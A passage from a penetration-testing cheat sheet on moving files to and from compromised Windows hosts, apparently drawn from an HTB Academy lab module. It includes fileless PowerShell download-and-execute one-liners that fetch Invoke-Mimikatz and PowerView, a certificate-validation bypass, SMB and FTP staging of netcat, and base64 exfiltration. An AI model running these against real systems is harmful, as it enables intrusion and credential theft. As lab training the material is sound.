# File transfers cheat sheet and more 

## Table Of Content

- [File transfers](#File-transfers)
-------------------------------------------------------------------------------------
- [Windows File Transfer Methods](#Windows-File-Transfer-Methods)
  - [Introduction](#Introduction)
  - [Windows Download Operations](#Windows-Download-Operations)
  - [PowerShell Base64 Encode and Decode](#PowerShell-Base64-Encode-and-Decode)
  - [PowerShell Web Downloads](#PowerShell-Web-Downloads)
  - [PowerShell DownloadFile Method](#PowerShell-DownloadFile-Method)
  - [PowerShell DownloadString Fileless Method](#PowerShell-DownloadString-Fileless-Method)
  - [PowerShell Invoke WebRequest](#PowerShell-Invoke-WebRequest)
  - [Common Errors with PowerShell](#Common-Errors-with-PowerShell)
  - [SMB Downloads](#SMB-Downloads)
  - [FTP Downloads](#FTP-Downloads)
  - [Upload Operations](#Upload-Operations)
  - [PowerShell Base64 Encode and Decode upload](#PowerShell-Base64-Encode-and-Decode-upload)
  - [PowerShell Web Uploads](#PowerShell-Web-Uploads)
  - [PowerShell Base64 Web Upload](#PowerShell-Base64-Web-Upload)
  - [SMB Uploads](#SMB-Uploads)
  - [Configuring WebDav Server](#Configuring-WebDav-Server)
  - [FTP Uploads](#FTP-Uploads)
  -------------------------------------------------------------------------------------
- [Linux File Transfer Methods](#Linux-File-Transfer-Methods)
  - [Linux Download Operations](#Linux-Download-Operations)
  - [Base64 Encoding and Decoding](#Base64-Encoding-and-Decoding)
  - [Web Downloads with Wget and cURL](#Web-Downloads-with-Wget-and-cURL)
  - [Fileless Attacks Using Linux](#Fileless-Attacks-Using-Linux)
  - [Download with Bash dev tcp](#Download-with-Bash-dev-tcp)
  - [SSH Downloads](#SSH-Downloads)
  - [Upload Operations](#Upload-Operations)
  - [Alternative Web File Transfer Method](#Alternative-Web-File-Transfer-Method)
  - [SCP Upload](#SCP-Upload)
-------------------------------------------------------------------------------------
- [Transfering Files with Code](#Transfering-Files-with-Code)
  - [Python](#Python)
  - [PHP](#PHP)
  - [Other Languages](#Other-Languages)
  - [Upload Operations using Python3](#Upload-Operations-using-Python3)
-------------------------------------------------------------------------------------
- [Miscellaneous File Transfer Methods](#Miscellaneous-File-Transfer-Methods)
-------------------------------------------------------------------------------------
- [Protected File Transfers](#Protected-File-Transfers)
-------------------------------------------------------------------------------------
- [Catching Files over HTTP and HTTPS](#Catching-Files-over-HTTP-and-HTTPS)
-------------------------------------------------------------------------------------
- [Living off The Land](#Living-off-The-Land)
-------------------------------------------------------------------------------------
- [Detection](#Detection)
-------------------------------------------------------------------------------------
- [Evading Detection](#Evading-Detection)
-------------------------------------------------------------------------------------




![image](https://user-images.githubusercontent.com/24814781/182864196-0d4ea001-1ea6-49e4-b9ac-042d1a1b320c.png)




## File transfers
There are many situations when transferring files to or from a target system is necessary. Let's imagine the following scenario:

### Setting the Stage
During an engagement, we gain remote code execution (RCE) on an IIS web server via an unrestricted file upload vulnerability. We upload a web shell initially and then send ourselves a reverse shell to enumerate the system further in an attempt to escalate privileges. We attempt to use PowerShell to transfer PowerUp.ps1
```
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
```
(a PowerShell script to enumerate privilege escalation vectors), but PowerShell is blocked by the Application Control Policy.
```
https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control
```
We perform our local enumeration manually and find that we have SeImpersonatePrivilege.
```
https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege
```

We need to transfer a binary to our target machine to escalate privileges using the PrintSpoofer tool.
```
https://github.com/itm4n/PrintSpoofer
```
We then try to use Certutil
```
https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
```
to download the file we compiled ourselves directly from our own GitHub, but the organization has strong web content filtering in place. We cannot access websites such as GitHub, Dropbox, Google Drive, etc., that can be used to transfer files. Next, we set up an FTP Server and tried to use the Windows FTP client to transfer files, but the network firewall blocked outbound traffic for port 21 (TCP). We tried to use the Impacket smbserver tool
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py
```
to create a folder, and we found that outgoing traffic to TCP port 445 (SMB) was allowed. We used this file transfer method to successfully copy the binary onto our target machine and accomplish our goal of escalating privileges to an administrator-level user. 

Understanding different ways to perform file transfers and how networks operate can help us accomplish our goals during an assessment. We must be aware of host controls that may prevent our actions, like application whitelisting or AV/EDR blocking specific applications or activities. File transfers are also affected by network devices such as Firewalls, IDS, or IPS which can monitor or block particular ports or uncommon operations.

File transfer is a core feature of any operating system, and many tools exist to achieve this. However, many of these tools may be blocked or monitored by diligent administrators, and it is worth reviewing a range of techniques that may be possible in a given environment.

This module covers techniques that leverage tools and applications commonly available on Windows and Linux systems. The list of techniques is not exhaustive. The information within this module can also be used as a reference guide when working through other HTB Academy modules, as many of the in-module exercises will require us to transfer files to/from a target host or to/from the provided Pwnbox. Target Windows and Linux machines are provided to complete a few hands-on exercises as part of the module. It is worth utilizing these targets to experiment with as many of the techniques demonstrated in the module sections as possible. Observe the nuances between the different transfer methods and note down situations where they would be helpful. Once you have completed this module, try out the various techniques in other HTB Academy modules and boxes and labs on the HTB main platform.

-------------------------------------------------------------------------------------

## Windows File Transfer Methods

### Introduction
The Windows operating system has evolved over the past few years, and new versions come with different utilities for file transfer operations. Understanding file transfer in Windows can help both attackers and defenders. Attackers can use various file transfer methods to operate and avoid being caught. Defenders can learn how these methods work to monitor and create the corresponding policies to avoid being compromised. Let's use the Microsoft Astaroth Attack
```
https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/
```
blog post as an example of an advanced persistent threat (APT).

The blog post starts out talking about fileless threats.
```
https://docs.microsoft.com/en-us/microsoft-365/security/intelligence/fileless-threats?view=o365-worldwide
```
The term fileless suggests that a threat doesn't come in a file, they use legitimate tools built into a system to execute an attack. This doesn't mean that there's not a file transfer operation. As discussed later in this section, the file is not "present" on the system but runs in memory.

The Astaroth attack generally followed these steps: A malicious link in a spear-phishing email led to an LNK file. When double-clicked, the LNK file caused the execution of the WMIC tool
```
https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic
```
with the "/Format" parameter, which allowed the download and execution of malicious JavaScript code. The JavaScript code, in turn, downloads payloads by abusing the Bitsadmin tool.
```
https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool
```
All the payloads were base64-encoded and decoded using the Certutil tool resulting in a few DLL files. The regsvr32 tool
```
https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32
```
was then used to load one of the decoded DLLs, which decrypted and loaded other files until the final payload, Astaroth, was injected into the Userinit process. Below is a graphical depiction of the attack.

![image](https://user-images.githubusercontent.com/24814781/182866694-e5bf498d-2e4b-45ca-916e-3ecf21357e0f.png)

This is an excellent example of multiple methods for file transfer and the threat actor using those methods to bypass defenses.

This section will discuss using some native Windows tools for download and upload operations. Later in the module, we'll discuss Living Off The Land binaries on Windows & Linux and how to use them to perform file transfer operations.

### Windwos Download Operations

We have access to the machine MS02, and we need to download a file from our Pwnbox machine. Let's see how we can accomplish this using multiple File Download methods.

![image](https://user-images.githubusercontent.com/24814781/182867651-286106d2-e74d-497f-b752-3a5bf1898308.png)

### PowerShell Base64 Encode and Decode
Depending on the file size we want to transfer, we can use different methods that do not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content. Let's see how we can do this with PowerShell.

An essential step in using this method is to ensure the file you encode and decode is correct. We can use md5sum,
```
https://man7.org/linux/man-pages/man1/md5sum.1.html
```
a program that calculates and verifies 128-bit MD5 checksums. The MD5 hash functions as a compact digital fingerprint of a file, meaning a file should have the same MD5 hash everywhere. Let's attempt to transfer a sample ssh key. It can be anything else, from our Pwnbox to the Windows target.

### Check SSH Key MD5 Hash
```
Suljov@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```
### Encode SSH Key to Base64
```
Suljov@htb[/htb]$ cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```
We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.
```
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
```
Finally, we can confirm if the file was transferred successfully using the Get-FileHash
```
https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2
```
cmdlet, which does the same thing that md5sum does.

### Confirming the MD5 Hashes Match
```
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
```
Note: While this method is convinient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum length of the string that you can use at the command prompt of 8191 characters. Also webshell may fail if you attempt to send large strings. 

While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.

### PowerShell Web Downloads

Most companies allow HTTP and HTTPS outbound traffic through the firewall to allow employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. Still, defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe), or only allow access to a list of whitelisted domains in more restricted networks.

PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient
```
https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0
```
class can be used to download a file over HTTP, HTTPS or FTP. The following table
```
https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0
```
describes WebClient methods for downloading data from a resource:

![image](https://user-images.githubusercontent.com/24814781/182870767-454574bb-403a-4c86-b8af-842f95d79a98.png)


Method 	     --        Description

OpenRead 	    --       Returns the data from a resource as a Stream.
```
https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0
```
```
https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0
```

OpenReadAsync 	--     Returns the data from a resource without blocking the calling thread.
```
https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0
```

DownloadData 	    --   Downloads data from a resource and returns a Byte array.
```
https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0
```

DownloadDataAsync 	-- Downloads data from a resource and returns a Byte array without blocking the calling thread.
```
https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0
```

DownloadFile 	 --      Downloads data from a resource to a local file.
```
https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0
```

DownloadFileAsync --	 Downloads data from a resource to a local file without blocking the calling thread.
```
https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0
```

DownloadString 	  --   Downloads a String from a resource and returns a String.
```
https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0
```

DownloadStringAsync -- Downloads a String from a resource without blocking the calling thread.
```
https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0
```

Let's explore some examples of those methods for downloading files using PowerShell.


### PowerShell DownloadFile Method

We can specify the class name Net.WebClient and the method DownloadFile with the parameters corresponding to the URL of the target file to download and the output file name.

### File Download
```
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')
```

### PowerShell DownloadString Fileless Method
As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression
```
https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2
```
cmdlet or the alias IEX.
```
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
IEX also accepts pipeline input.
```
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

### PowerShell Invoke WebRequest
From PowerShell 3.0 onwards, the Invoke-WebRequest
```
https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2
```
cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name.
```
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
Harmj0y has compiled an extensive list of PowerShell download cradles here.
```
https://gist.github.com/HarmJ0y/bb48307ffa663256e239
```

### Common Errors with PowerShell
There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.

![image](https://user-images.githubusercontent.com/24814781/182872072-cb5cb428-918a-4be3-a380-88eecfee35aa.png)

This can be bypassed using the parameter -UseBasicParsing.
```
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:
```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB Downloads
The Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.

We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with smbserver.py
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py
```
from Impacket and then use copy, move, PowerShell Copy-Item, or any other tool that allows connection to SMB.

### Create the SMB Server
```
Suljov@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

To download a file from the SMB server to the current working directory, we can use the following command:
### Copy a File from the SMB Server
```
C:\htb> copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
```
New versions of Windows block unauthenticated guest access, as we can see in the following command:
```
C:\htb> copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```
To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine:
### Create the SMB Server with a Username and Password
```
Suljov@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
### Mount the SMB Server with Username and Password
```
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```

Note: You can also mount the SMB server if you receive an error when you use `copy filename \\IP\sharename`.

### FTP Downloads

Another way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.

We can configure an FTP Server in our attack host using Python3 pyftpdlib module. It can be installed with the following command:
### Installing the FTP Server Python3 Module - pyftpdlib
```
Suljov@htb[/htb]$ sudo pip3 install pyftpdlib
```
Then we can specify port number 21 because, by default, pyftpdlib uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password.

### Setting up a Python3 FTP Server
```
Suljov@htb[/htb]$ sudo python3 -m pyftpdlib --port 21

[I 2022-05-17 10:09:19] concurrency model: async
[I 2022-05-17 10:09:19] masquerade (NAT) address: None
[I 2022-05-17 10:09:19] passive ports: None
[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
```

After the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell Net.WebClient.

### Transfering Files from an FTP Server Using PowerShell
```
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')
```
When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.

### Create a Command File for the FTP Client and Download the Target File
```
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```
### Upload Operations

There are also situations such as password cracking, analysis, exfiltration, etc., where we must upload files from our target machine into our attack host. We can use the same methods we used for download operation but now for Uploads. Let's see how we can accomplish uploading files in various ways.

### PowerShell Base64 Encode and Decode upload
We saw how to decode a base64 string using Powershell. Now, let's do the reverse operation and encode a file so we can decode it on our attack host.

### Encode File Using PowerShell
```
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```

We copy this content and paste it into our attack host, use the base64 command to decode it, and use the md5sum application to confirm the transfer happened correctly.

### Decode Base64 String in Linux
```
Suljov@htb[/htb]$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
Suljov@htb[/htb]$ md5sum hosts 
3688374325b992def12793500307566d  hosts
```

### PowerShell Web Uploads
PowerShell doesn't have a built-in function for upload operations, but we can use Invoke-WebRequest or Invoke-RestMethod to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.

For our web server, we can use uploadserver
```
[https://docs.python.org/3/library/http.server.html](https://github.com/Densaugeo/uploadserver)
```
an extended module of the Python HTTP.server module
```
https://docs.python.org/3/library/http.server.html
```
### Installing a Configured WebServer with Upload
```
Suljov@htb[/htb]$ pip3 install upload server

Suljov@htb[/htb]$ python3 -m uploadserver
File upload available at /upload
